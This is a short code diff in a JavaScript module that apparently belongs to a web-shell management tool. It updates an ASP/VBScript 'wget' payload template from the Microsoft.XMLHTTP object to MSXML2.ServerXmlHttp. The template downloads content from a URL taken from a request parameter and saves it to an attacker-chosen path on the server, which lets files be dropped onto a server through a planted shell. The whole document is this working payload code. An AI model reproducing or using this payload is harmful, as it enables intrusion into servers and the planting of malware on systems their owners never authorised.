@@ -71,7 +71,7 @@ module.exports = (arg1, arg2, arg3) => ({
 
   wget: {
     _:
-      `Dim SI:Set x=CreateObject("Microsoft.XMLHTTP"):x.Open "GET",""&bd(Request("${arg1}"))&"",0:x.Send():If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:set s=CreateObject("ADODB.Stream"):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile ""&bd(Request("${arg2}"))&"",2:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="1":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)`,
+      `Dim SI:Set x=CreateObject("MSXML2.ServerXmlHttp"):x.Open "GET",""&bd(Request("${arg1}"))&"",0:x.Send():If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:set s=CreateObject("ADODB.Stream"):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile ""&bd(Request("${arg2}"))&"",2:If Err Then:SI="ERROR:// "&Err.Description:Err.Clear:Else:SI="1":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)`,
     [arg1]: "#{hex::url}",
     [arg2]: "#{hex::path}"
   }
